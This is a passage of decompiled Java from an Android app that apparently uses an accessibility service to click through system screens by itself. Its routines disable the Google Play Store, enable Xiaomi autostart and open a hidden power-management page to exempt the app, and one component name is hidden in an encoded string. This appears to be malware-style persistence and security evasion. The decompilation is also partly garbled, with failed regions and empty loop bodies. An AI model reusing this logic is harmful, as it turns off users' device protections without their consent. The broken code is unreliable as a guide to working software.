                            str2 = str;
                            list = list2;
                            it = dh0.f55761b1.iterator();
                            while (true) {
                                if (!it.hasNext()) {
                                }
                            }
                            genericSteps$executePlayStoreDisable$1.f53926a0 = c0364a12;
                            genericSteps$executePlayStoreDisable$1.f53927a1 = str2;
                            genericSteps$executePlayStoreDisable$1.f53928a2 = null;
                            genericSteps$executePlayStoreDisable$1.f53931a5 = 4;
                            if (b81.m210571b1(350L, genericSteps$executePlayStoreDisable$1) != coroutineSingletons) {
                            }
                        }
                        return coroutineSingletons;
                    }
                }
                c0364a13.getClass();
                ApplicationInfo applicationInfo2 = c0364a13.f55048a1.getPackageManager().getApplicationInfo(str, 0);
                t60.m214694b5(applicationInfo2, "context.packageManager.getApplicationInfo(pkg, 0)");
                z2 = !applicationInfo2.enabled;
                if (z2) {
                }
                return Boolean.FALSE;
            }
            if (i2 != 3) {
                if (i2 != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                str = genericSteps$executePlayStoreDisable$1.f53927a1;
                c0364a13 = genericSteps$executePlayStoreDisable$1.f53926a0;
                kg1.m213544f4(obj);
                c0364a13.getClass();
                try {
                    ApplicationInfo applicationInfo22 = c0364a13.f55048a1.getPackageManager().getApplicationInfo(str, 0);
                    t60.m214694b5(applicationInfo22, "context.packageManager.getApplicationInfo(pkg, 0)");
                    z2 = !applicationInfo22.enabled;
                } catch (Exception unused3) {
                }
                if (z2) {
                    t60.m214704c5(c0364a13.f55049a2, "[PlayStore] ✅ 已成功禁用");
                    c0364a13.m212138c2();
                    return Boolean.TRUE;
                }
                return Boolean.FALSE;
            }
            list = genericSteps$executePlayStoreDisable$1.f53928a2;
            str2 = genericSteps$executePlayStoreDisable$1.f53927a1;
            c0364a12 = genericSteps$executePlayStoreDisable$1.f53926a0;
            try {
                kg1.m213544f4(obj);
                it = dh0.f55761b1.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        String str4 = (String) it.next();
                        AccessibilityNodeInfo rootInActiveWindow2 = c0364a12.f55047a0.getRootInActiveWindow();
                        if (rootInActiveWindow2 == null ? false : c0364a12.m212124a4(rootInActiveWindow2, str4)) {
                            t60.m214704c5(c0364a12.f55049a2, "[PlayStore] 确认对话框点击'" + str4 + "'成功");
                            break;
                        }
                    } else {
                        Iterator it2 = list.iterator();
                        while (true) {
                            if (!it2.hasNext()) {
                                break;
                            }
                            String str5 = (String) it2.next();
                            AccessibilityNodeInfo rootInActiveWindow3 = c0364a12.f55047a0.getRootInActiveWindow();
                            if (rootInActiveWindow3 == null ? false : c0364a12.m212124a4(rootInActiveWindow3, str5)) {
                                t60.m214704c5(c0364a12.f55049a2, "[PlayStore] 确认对话框(备用)点击'" + str5 + "'成功");
                                break;
                            }
                        }
                    }
                }
                genericSteps$executePlayStoreDisable$1.f53926a0 = c0364a12;
                genericSteps$executePlayStoreDisable$1.f53927a1 = str2;
                genericSteps$executePlayStoreDisable$1.f53928a2 = null;
                genericSteps$executePlayStoreDisable$1.f53931a5 = 4;
            } catch (Exception e3) {
                e = e3;
                c0364a13 = c0364a12;
                tz0.m214807a7("[PlayStore] 异常: ", e.getMessage(), c0364a13.f55049a2);
                return Boolean.FALSE;
            }
            if (b81.m210571b1(350L, genericSteps$executePlayStoreDisable$1) != coroutineSingletons) {
                str = str2;
                c0364a13 = c0364a12;
                c0364a13.getClass();
                ApplicationInfo applicationInfo222 = c0364a13.f55048a1.getPackageManager().getApplicationInfo(str, 0);
                t60.m214694b5(applicationInfo222, "context.packageManager.getApplicationInfo(pkg, 0)");
                z2 = !applicationInfo222.enabled;
                if (z2) {
                }
                return Boolean.FALSE;
            }
            return coroutineSingletons;
        }
        str = genericSteps$executePlayStoreDisable$1.f53927a1;
        C0364a1 c0364a15 = genericSteps$executePlayStoreDisable$1.f53926a0;
        kg1.m213544f4(obj);
        c0364a1 = c0364a15;
        genericSteps$executePlayStoreDisable$1.f53926a0 = c0364a1;
        genericSteps$executePlayStoreDisable$1.f53927a1 = str;
        genericSteps$executePlayStoreDisable$1.f53931a5 = 2;
        Object objM212141c7 = c0364a1.m212141c7(1500L, genericSteps$executePlayStoreDisable$1);
        c0364a13 = c0364a1;
        if (objM212141c7 != coroutineSingletons) {
            List<String> list22 = dh0.f55760b0;
            while (r4.hasNext()) {
            }
            c0364a13.getClass();
            ApplicationInfo applicationInfo2222 = c0364a13.f55048a1.getPackageManager().getApplicationInfo(str, 0);
            t60.m214694b5(applicationInfo2222, "context.packageManager.getApplicationInfo(pkg, 0)");
            z2 = !applicationInfo2222.enabled;
            if (z2) {
            }
            return Boolean.FALSE;
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Can't wrap try/catch for region: R(15:201|110|(3:173|112|(3:114|(3:117|118|119)|161))|121|122|187|123|124|169|125|126|181|127|128|(0)(0)) */
    /* JADX WARN: Can't wrap try/catch for region: R(8:79|80|189|81|82|177|83|84) */
    /* JADX WARN: Code restructure failed: missing block: B:100:0x0226, code lost:
    
        r0 = r0.iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:103:0x0230, code lost:
    
        r1 = r0.next();
        r15 = new android.graphics.Rect();
        r1.getBoundsInScreen(r15);
     */
    /* JADX WARN: Code restructure failed: missing block: B:104:0x0242, code lost:
    
        if (r15.width() > 0) goto L198;
     */
    /* JADX WARN: Code restructure failed: missing block: B:108:0x024b, code lost:
    
        r18 = r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:109:0x025f, code lost:
    
        if (java.lang.Math.abs(r15.centerY() - r19.centerY()) >= 80) goto L133;
     */
    /* JADX WARN: Code restructure failed: missing block: B:111:0x0265, code lost:
    
        if (r1.isCheckable() != false) goto L173;
     */
    /* JADX WARN: Code restructure failed: missing block: B:113:0x026b, code lost:
    
        if (r1.isChecked() != false) goto L114;
     */
    /* JADX WARN: Code restructure failed: missing block: B:114:0x026d, code lost:
    
        p000.t60.m214704c5(r13.f55049a2, r7 + r10 + "' 开关已开启(Y匹配)，无需操作");
        r13.m212138c2();
        r2.f53932a0 = r13;
        r2.f53933a1 = r10;
        r2.f53934a2 = r14;
        r2.f53935a3 = r12;
        r2.f53936a4 = null;
        r2.f53937a5 = r9;
        r2.f53938a6 = r4;
        r2.f53941a9 = 4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:115:0x02a1, code lost:
    
        if (p000.b81.m210571b1(500, r2) != r3) goto L117;
     */
    /* JADX WARN: Code restructure failed: missing block: B:117:0x02a5, code lost:
    
        r15 = r14;
        r14 = r10;
        r10 = r12;
        r12 = r15;
        r15 = r13;
     */
    /* JADX WARN: Code restructure failed: missing block: B:120:0x02ad, code lost:
    
        r15 = r14;
        r14 = r10;
        r10 = r12;
        r12 = r15;
        r21 = r7;
        r15 = r13;
     */
    /* JADX WARN: Code restructure failed: missing block: B:121:0x02b6, code lost:
    
        r0 = r13.f55049a2;
        r1 = r15.centerX();
     */
    /* JADX WARN: Code restructure failed: missing block: B:122:0x02bc, code lost:
    
        r17 = r2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:123:0x02be, code lost:
    
        r2 = r15.centerY();
     */
    /* JADX WARN: Code restructure failed: missing block: B:124:0x02c2, code lost:
    
        r20 = r4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:125:0x02c4, code lost:
    
        r4 = new java.lang.StringBuilder();
     */
    /* JADX WARN: Code restructure failed: missing block: B:126:0x02c9, code lost:
    
        r21 = r7;
     */
    /* JADX WARN: Code restructure failed: missing block: B:127:0x02cb, code lost:
    
        r4.append("[小米自启] 通过Y坐标匹配找到开关，点击(");
        r4.append(r1);
        r4.append(", ");
        r4.append(r2);
        r4.append(")");
        p000.t60.m214704c5(r0, r4.toString());
        r13.m212123a2(r15.centerX(), r15.centerY());
     */
    /* JADX WARN: Code restructure failed: missing block: B:128:0x02ee, code lost:
    
        r4 = r9;
        r9 = r13;
        r2 = r17;
        r1 = 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:129:0x02f5, code lost:
    
        r2 = r14;
        r14 = r10;
        r10 = r12;
        r12 = r2;
        r15 = r13;
        r2 = r17;
        r4 = r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:130:0x02ff, code lost:
    
        r21 = r7;
     */
    /* JADX WARN: Code restructure failed: missing block: B:131:0x0302, code lost:
    
        r21 = r7;
        r2 = r14;
        r14 = r10;
        r10 = r12;
        r12 = r2;
        r15 = r13;
        r2 = r17;
     */
    /* JADX WARN: Code restructure failed: missing block: B:132:0x030e, code lost:
    
        r17 = r2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:133:0x0311, code lost:
    
        r0 = r18;
     */
    /* JADX WARN: Code restructure failed: missing block: B:135:0x031c, code lost:
    
        r17 = r2;
        r20 = r4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:139:0x0331, code lost:
    
        r2.f53932a0 = r9;
        r2.f53933a1 = r10;
        r2.f53934a2 = null;
        r2.f53935a3 = null;
        r2.f53936a4 = null;
        r2.f53941a9 = 5;
     */
    /* JADX WARN: Code restructure failed: missing block: B:140:0x0345, code lost:
    
        if (p000.b81.m210571b1(1000, r2) != r3) goto L142;
     */
    /* JADX WARN: Code restructure failed: missing block: B:142:0x0349, code lost:
    
        r5 = r9;
        r4 = r10;
     */
    /* JADX WARN: Code restructure failed: missing block: B:144:0x0374, code lost:
    
        if (p000.b81.m210571b1(500, r2) != r3) goto L146;
     */
    /* JADX WARN: Code restructure failed: missing block: B:152:0x03b7, code lost:
    
        if (p000.b81.m210571b1(800, r2) == r3) goto L161;
     */
    /* JADX WARN: Code restructure failed: missing block: B:156:0x03ed, code lost:
    
        if (p000.b81.m210571b1(800, r2) == r3) goto L161;
     */
    /* JADX WARN: Code restructure failed: missing block: B:160:0x0411, code lost:
    
        if (p000.b81.m210571b1(500, r2) == r3) goto L161;
     */
    /* JADX WARN: Code restructure failed: missing block: B:194:0x0101, code lost:
    
        r7 = r21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:85:0x01ea, code lost:
    
        r13 = r9;
        r15 = r10;
        r12 = r18;
     */
    /* JADX WARN: Code restructure failed: missing block: B:86:0x01ee, code lost:
    
        r10 = r19;
     */
    /* JADX WARN: Code restructure failed: missing block: B:87:0x01f1, code lost:
    
        r19 = r13;
     */
    /* JADX WARN: Code restructure failed: missing block: B:92:0x020a, code lost:
    
        r0 = r13.f55047a0.getRootInActiveWindow();
     */
    /* JADX WARN: Code restructure failed: missing block: B:93:0x0210, code lost:
    
        if (r0 == null) goto L94;
     */
    /* JADX WARN: Code restructure failed: missing block: B:94:0x0212, code lost:
    
        r4 = r9;
        r9 = r13;
     */
    /* JADX WARN: Code restructure failed: missing block: B:95:0x0218, code lost:
    
        r0 = r0.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/sliding_button");
     */
    /* JADX WARN: Code restructure failed: missing block: B:96:0x021c, code lost:
    
        if (r0 != null) goto L97;
     */
    /* JADX WARN: Path cross not found for [B:134:0x0315, B:100:0x0226], limit reached: 196 */
    /* JADX WARN: Path cross not found for [B:134:0x0315, B:175:0x020a], limit reached: 196 */
    /* JADX WARN: Path cross not found for [B:175:0x020a, B:134:0x0315], limit reached: 196 */
    /* JADX WARN: Path cross not found for [B:89:0x01fb, B:63:0x013e], limit reached: 196 */
    /* JADX WARN: Removed duplicated region for block: B:139:0x0331  */
    /* JADX WARN: Removed duplicated region for block: B:148:0x037b  */
    /* JADX WARN: Removed duplicated region for block: B:159:0x03f8  */
    /* JADX WARN: Removed duplicated region for block: B:175:0x020a A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:195:0x0386 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:32:0x00bf  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0107  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:152:0x03b7 -> B:154:0x03ba). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:156:0x03ed -> B:39:0x00e5). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:94:0x0212 -> B:46:0x0101). Please report as a decompilation issue!!! */
    /* renamed from: b5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212135b5(ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$executeXiaomiAutoStart$1 genericSteps$executeXiaomiAutoStart$1;
        C0364a1 c0364a1;
        String str;
        int i;
        String str2;
        int i2;
        int i3;
        Rect rect;
        Iterator<AccessibilityNodeInfo> it;
        AccessibilityNodeInfo accessibilityNodeInfo;
        String str3;
        C0364a1 c0364a12;
        Rect rect2;
        String str4;
        String str5;
        int i4;
        C0364a1 c0364a13;
        AccessibilityNodeInfo parent;
        if (continuationImpl instanceof GenericSteps$executeXiaomiAutoStart$1) {
            genericSteps$executeXiaomiAutoStart$1 = (GenericSteps$executeXiaomiAutoStart$1) continuationImpl;
            int i5 = genericSteps$executeXiaomiAutoStart$1.f53941a9;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                genericSteps$executeXiaomiAutoStart$1.f53941a9 = i5 - Integer.MIN_VALUE;
            } else {
                genericSteps$executeXiaomiAutoStart$1 = new GenericSteps$executeXiaomiAutoStart$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$executeXiaomiAutoStart$1.f53939a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        String str6 = "[小米自启] ✅ '";
        switch (genericSteps$executeXiaomiAutoStart$1.f53941a9) {
            case 0:
                kg1.m213544f4(obj);
                boolean zM212120c4 = m212120c4();
                String str7 = this.f55049a2;
                if (!zM212120c4) {
                    t60.m214704c5(str7, "[小米自启] 非小米设备，跳过");
                    return Boolean.TRUE;
                }
                t60.m214704c5(str7, "[小米自启] 开始在后台启动管理页面查找APP开关...");
                String strM212137c1 = m212137c1();
                tz0.m214809a9("[小米自启] 应用名: '", strM212137c1, "'", str7);
                c0364a1 = this;
                str = strM212137c1;
                i = 0;
                if (i < 20) {
                    dqtvuisjd dqtvuisjdVar = c0364a1.f55047a0;
                    String str8 = c0364a1.f55049a2;
                    AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                            it = listFindAccessibilityNodeInfosByText.iterator();
                            C0364a1 c0364a14 = c0364a1;
                            str4 = str;
                            c0364a13 = c0364a14;
                            accessibilityNodeInfo = rootInActiveWindow;
                            while (true) {
                                if (!it.hasNext()) {
                                    str2 = str6;
                                    t60.m214704c5(c0364a13.f55049a2, "[小米自启] 第" + i + "次找到文本但未找到开关，滚动重试");
                                    m212121c6(accessibilityNodeInfo);
                                    genericSteps$executeXiaomiAutoStart$1.f53932a0 = c0364a13;
                                    genericSteps$executeXiaomiAutoStart$1.f53933a1 = str4;
                                    genericSteps$executeXiaomiAutoStart$1.f53934a2 = null;
                                    genericSteps$executeXiaomiAutoStart$1.f53935a3 = null;
                                    genericSteps$executeXiaomiAutoStart$1.f53936a4 = null;
                                    genericSteps$executeXiaomiAutoStart$1.f53937a5 = i;
                                    genericSteps$executeXiaomiAutoStart$1.f53941a9 = 7;
                                    break;
                                } else {
                                    AccessibilityNodeInfo next = it.next();
                                    if (next.isVisibleToUser()) {
                                        Rect rectM24a5 = AbstractC0003a2.m24a5(next);
                                        if (rectM24a5.width() > 0 && rectM24a5.height() > 0 && (parent = next.getParent()) != null) {
                                            try {
                                            } catch (Exception unused) {
                                                rect2 = rectM24a5;
                                                c0364a12 = c0364a13;
                                                str3 = str4;
                                                break;
                                            }
                                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = parent.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/sliding_button");
                                            if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                                                AccessibilityNodeInfo accessibilityNodeInfo2 = listFindAccessibilityNodeInfosByViewId.get(0);
                                                if (accessibilityNodeInfo2.isCheckable()) {
                                                    try {
                                                    } catch (Exception unused2) {
                                                        str3 = str4;
                                                        rect = rectM24a5;
                                                        c0364a12 = c0364a13;
                                                        i3 = i;
                                                        i2 = 0;
                                                        rect2 = rect;
                                                        str4 = str3;
                                                        if (i2 == 0) {
                                                        }
                                                        int i6 = i2;
                                                        str5 = str6;
                                                        i = i3;
                                                        c0364a13 = c0364a12;
                                                        genericSteps$executeXiaomiAutoStart$1 = genericSteps$executeXiaomiAutoStart$1;
                                                        i4 = i6;
                                                        if (i4 != 0) {
                                                        }
                                                    }
                                                    if (accessibilityNodeInfo2.isChecked()) {
                                                        t60.m214704c5(c0364a13.f55049a2, str6 + str4 + "' 开关已开启，无需操作");
                                                        c0364a13.m212138c2();
                                                        genericSteps$executeXiaomiAutoStart$1.f53932a0 = c0364a13;
                                                        genericSteps$executeXiaomiAutoStart$1.f53933a1 = str4;
                                                        genericSteps$executeXiaomiAutoStart$1.f53934a2 = accessibilityNodeInfo;
                                                        genericSteps$executeXiaomiAutoStart$1.f53935a3 = it;
                                                        genericSteps$executeXiaomiAutoStart$1.f53936a4 = rectM24a5;
                                                        genericSteps$executeXiaomiAutoStart$1.f53937a5 = i;
                                                        genericSteps$executeXiaomiAutoStart$1.f53938a6 = 0;
                                                        genericSteps$executeXiaomiAutoStart$1.f53941a9 = 3;
                                                        if (b81.m210571b1(500L, genericSteps$executeXiaomiAutoStart$1) != coroutineSingletons) {
                                                            str3 = str4;
                                                            rect = rectM24a5;
                                                            c0364a12 = c0364a13;
                                                            i3 = i;
                                                            i2 = 0;
                                                        }
                                                    }
                                                }
                                                Rect rect3 = new Rect();
                                                accessibilityNodeInfo2.getBoundsInScreen(rect3);
                                                if (rect3.width() > 0 && rect3.height() > 0) {
                                                    String str9 = c0364a13.f55049a2;
                                                    int iCenterX = rect3.centerX();
                                                    int iCenterY = rect3.centerY();
                                                    Iterator<AccessibilityNodeInfo> it2 = it;
                                                    StringBuilder sb = new StringBuilder();
                                                    rect2 = rectM24a5;
                                                    sb.append("[小米自启] 通过父节点ViewID找到开关，点击(");
                                                    sb.append(iCenterX);
                                                    sb.append(", ");
                                                    sb.append(iCenterY);
                                                    sb.append(")");
                                                    t60.m214704c5(str9, sb.toString());
                                                    c0364a13.m212123a2(rect3.centerX(), rect3.centerY());
                                                    c0364a12 = c0364a13;
                                                    it = it2;
                                                    i3 = i;
                                                    i2 = 1;
                                                }
                                            }
                                            rect2 = rectM24a5;
                                            c0364a12 = c0364a13;
                                            it = it;
                                            i3 = i;
                                            i2 = 0;
                                        }
                                    }
                                    it = it;
                                    str6 = str6;
                                }
                            }
                            return Boolean.TRUE;
                        }
                        str2 = str6;
                        t60.m214704c5(str8, "[小米自启] 第" + i + "次未找到'" + str + "'，滚动重试");
                        m212121c6(rootInActiveWindow);
                        genericSteps$executeXiaomiAutoStart$1.f53932a0 = c0364a1;
                        genericSteps$executeXiaomiAutoStart$1.f53933a1 = str;
                        genericSteps$executeXiaomiAutoStart$1.f53937a5 = i;
                        genericSteps$executeXiaomiAutoStart$1.f53941a9 = 2;
                        break;
                    } else {
                        t60.m214704c5(str8, "[小米自启] 获取root节点失败");
                        genericSteps$executeXiaomiAutoStart$1.f53932a0 = c0364a1;
                        genericSteps$executeXiaomiAutoStart$1.f53933a1 = str;
                        genericSteps$executeXiaomiAutoStart$1.f53937a5 = i;
                        genericSteps$executeXiaomiAutoStart$1.f53941a9 = 1;
                        if (b81.m210571b1(500L, genericSteps$executeXiaomiAutoStart$1) != coroutineSingletons) {
                            str2 = str6;
                            i++;
                            str6 = str2;
                            if (i < 20) {
                                t60.m214704c5(c0364a1.f55049a2, "[小米自启] ❌ 未能找到并点击APP开关，返回");
                                c0364a1.m212138c2();
                                genericSteps$executeXiaomiAutoStart$1.f53932a0 = null;
                                genericSteps$executeXiaomiAutoStart$1.f53933a1 = null;
                                genericSteps$executeXiaomiAutoStart$1.f53941a9 = 8;
                                break;
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                i = genericSteps$executeXiaomiAutoStart$1.f53937a5;
                str = genericSteps$executeXiaomiAutoStart$1.f53933a1;
                c0364a1 = genericSteps$executeXiaomiAutoStart$1.f53932a0;
                kg1.m213544f4(obj);
                str2 = "[小米自启] ✅ '";
                i++;
                str6 = str2;
                if (i < 20) {
                }
                return coroutineSingletons;
            case 2:
                i = genericSteps$executeXiaomiAutoStart$1.f53937a5;
                str = genericSteps$executeXiaomiAutoStart$1.f53933a1;
                c0364a1 = genericSteps$executeXiaomiAutoStart$1.f53932a0;
                kg1.m213544f4(obj);
                str2 = "[小米自启] ✅ '";
                i++;
                str6 = str2;
                if (i < 20) {
                }
                return coroutineSingletons;
            case 3:
                i2 = genericSteps$executeXiaomiAutoStart$1.f53938a6;
                i3 = genericSteps$executeXiaomiAutoStart$1.f53937a5;
                rect = genericSteps$executeXiaomiAutoStart$1.f53936a4;
                it = genericSteps$executeXiaomiAutoStart$1.f53935a3;
                accessibilityNodeInfo = genericSteps$executeXiaomiAutoStart$1.f53934a2;
                str3 = genericSteps$executeXiaomiAutoStart$1.f53933a1;
                c0364a12 = genericSteps$executeXiaomiAutoStart$1.f53932a0;
                try {
                    kg1.m213544f4(obj);
                } catch (Exception unused3) {
                    rect2 = rect;
                    str4 = str3;
                    if (i2 == 0) {
                    }
                    int i62 = i2;
                    str5 = str6;
                    i = i3;
                    c0364a13 = c0364a12;
                    genericSteps$executeXiaomiAutoStart$1 = genericSteps$executeXiaomiAutoStart$1;
                    i4 = i62;
                    if (i4 != 0) {
                    }
                }
                return Boolean.TRUE;
            case 4:
                i2 = genericSteps$executeXiaomiAutoStart$1.f53938a6;
                i3 = genericSteps$executeXiaomiAutoStart$1.f53937a5;
                Iterator<AccessibilityNodeInfo> it3 = genericSteps$executeXiaomiAutoStart$1.f53935a3;
                AccessibilityNodeInfo accessibilityNodeInfo3 = genericSteps$executeXiaomiAutoStart$1.f53934a2;
                String str10 = genericSteps$executeXiaomiAutoStart$1.f53933a1;
                C0364a1 c0364a15 = genericSteps$executeXiaomiAutoStart$1.f53932a0;
                try {
                    kg1.m213544f4(obj);
                } catch (Exception unused4) {
                    str5 = str6;
                    AccessibilityNodeInfo accessibilityNodeInfo4 = accessibilityNodeInfo3;
                    it = it3;
                    str4 = str10;
                    accessibilityNodeInfo = accessibilityNodeInfo4;
                    i4 = i2;
                    i = i3;
                    c0364a13 = c0364a15;
                    if (i4 != 0) {
                    }
                }
                return Boolean.TRUE;
            case 5:
                String str11 = genericSteps$executeXiaomiAutoStart$1.f53933a1;
                C0364a1 c0364a16 = genericSteps$executeXiaomiAutoStart$1.f53932a0;
                kg1.m213544f4(obj);
                t60.m214704c5(c0364a16.f55049a2, "[小米自启] ✅ 已点击'" + str11 + "'的后台启动开关");
                c0364a16.m212138c2();
                genericSteps$executeXiaomiAutoStart$1.f53932a0 = null;
                genericSteps$executeXiaomiAutoStart$1.f53933a1 = null;
                genericSteps$executeXiaomiAutoStart$1.f53941a9 = 6;
                break;
            case 6:
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            case 7:
                i = genericSteps$executeXiaomiAutoStart$1.f53937a5;
                str4 = genericSteps$executeXiaomiAutoStart$1.f53933a1;
                c0364a13 = genericSteps$executeXiaomiAutoStart$1.f53932a0;
                kg1.m213544f4(obj);
                str2 = "[小米自启] ✅ '";
                String str12 = str4;
                c0364a1 = c0364a13;
                str = str12;
                i++;
                str6 = str2;
                if (i < 20) {
                }
                return coroutineSingletons;
            case 8:
                kg1.m213544f4(obj);
                return Boolean.FALSE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:114:0x0283, code lost:
    
        if (r4.m212140c5(r2) != r3) goto L116;
     */
    /* JADX WARN: Code restructure failed: missing block: B:122:0x02aa, code lost:
    
        if (r4.m212140c5(r2) != r3) goto L124;
     */
    /* JADX WARN: Removed duplicated region for block: B:110:0x026b A[PHI: r4
      0x026b: PHI (r4v14 com.storm.safe.rock.service.modules.yw5xud.a1) = (r4v12 com.storm.safe.rock.service.modules.yw5xud.a1), (r4v15 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:108:0x0268, B:16:0x004c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:113:0x027a A[PHI: r4
      0x027a: PHI (r4v16 com.storm.safe.rock.service.modules.yw5xud.a1) = (r4v14 com.storm.safe.rock.service.modules.yw5xud.a1), (r4v17 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:111:0x0277, B:15:0x0045] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:121:0x02a0 A[PHI: r4
      0x02a0: PHI (r4v18 com.storm.safe.rock.service.modules.yw5xud.a1) = (r4v12 com.storm.safe.rock.service.modules.yw5xud.a1), (r4v19 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:119:0x029d, B:13:0x0039] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:39:0x0101  */
    /* JADX WARN: Removed duplicated region for block: B:43:0x010d  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x016f  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x01bf A[PHI: r4 r17
      0x01bf: PHI (r4v12 com.storm.safe.rock.service.modules.yw5xud.a1) = 
      (r4v8 com.storm.safe.rock.service.modules.yw5xud.a1)
      (r4v10 com.storm.safe.rock.service.modules.yw5xud.a1)
      (r4v13 com.storm.safe.rock.service.modules.yw5xud.a1)
     binds: [B:79:0x01be, B:77:0x01ba, B:17:0x0053] A[DONT_GENERATE, DONT_INLINE]
      0x01bf: PHI (r17v8 int) = (r17v4 int), (r17v6 int), (r17v9 int) binds: [B:79:0x01be, B:77:0x01ba, B:17:0x0053] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:83:0x01cb  */
    /* renamed from: b6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212136b6(ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$executeXiaomiBackgroundManagement$1 genericSteps$executeXiaomiBackgroundManagement$1;
        int i;
        String str;
        C0364a1 c0364a1;
        C0364a1 c0364a12;
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo rootInActiveWindow2;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        C0364a1 c0364a13;
        AccessibilityNodeInfo rootInActiveWindow3;
        if (continuationImpl instanceof GenericSteps$executeXiaomiBackgroundManagement$1) {
            genericSteps$executeXiaomiBackgroundManagement$1 = (GenericSteps$executeXiaomiBackgroundManagement$1) continuationImpl;
            int i2 = genericSteps$executeXiaomiBackgroundManagement$1.f53946a4;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = i2 - Integer.MIN_VALUE;
            } else {
                genericSteps$executeXiaomiBackgroundManagement$1 = new GenericSteps$executeXiaomiBackgroundManagement$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$executeXiaomiBackgroundManagement$1.f53944a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (genericSteps$executeXiaomiBackgroundManagement$1.f53946a4) {
            case 0:
                kg1.m213544f4(obj);
                boolean zM212120c4 = m212120c4();
                String str2 = this.f55049a2;
                if (!zM212120c4) {
                    t60.m214704c5(str2, "[小米后台] 非小米设备，跳过");
                    return Boolean.TRUE;
                }
                t60.m214704c5(str2, "[小米后台] 开始执行小米后台管理...");
                final String strM212137c1 = m212137c1();
                final String packageName = this.f55048a1.getPackageName();
                t60.m214694b5(packageName, "pkg");
                i = 0;
                Iterator it = AbstractC0716jf.m213306g5(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.GenericSteps$tryOpenXiaomiPowerPage$attempts$1
                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                    {
                        super(0);
                    }

                    @Override // p000.w00
                    public final Object invoke() {
                        Intent intent = new Intent();
                        intent.setComponent(new ComponentName(StringUtil.m212470a0("KFYcdEAxGScZISROFChGPQk+UiM="), "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"));
                        intent.putExtra("package_name", packageName);
                        intent.putExtra("package_label", strM212137c1);
                        intent.addFlags(276824064);
                        this.f53953a0.f55048a1.startActivity(intent);
                        return Boolean.TRUE;
                    }
                }, new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.GenericSteps$tryOpenXiaomiPowerPage$attempts$2
                    {
                        super(0);
                    }

                    @Override // p000.w00
                    public final Object invoke() {
                        Intent intent = new Intent();
                        intent.setComponent(new ComponentName(StringUtil.m212470a0("KFYcdEAxGScZISROFChGPQk+UiM="), "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"));
                        intent.addFlags(276824064);
                        this.f53956a0.f55048a1.startActivity(intent);
                        return Boolean.TRUE;
                    }
                }, new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.GenericSteps$tryOpenXiaomiPowerPage$attempts$3
                    {
                        super(0);
                    }

                    @Override // p000.w00
                    public final Object invoke() {
                        Intent intent = new Intent();
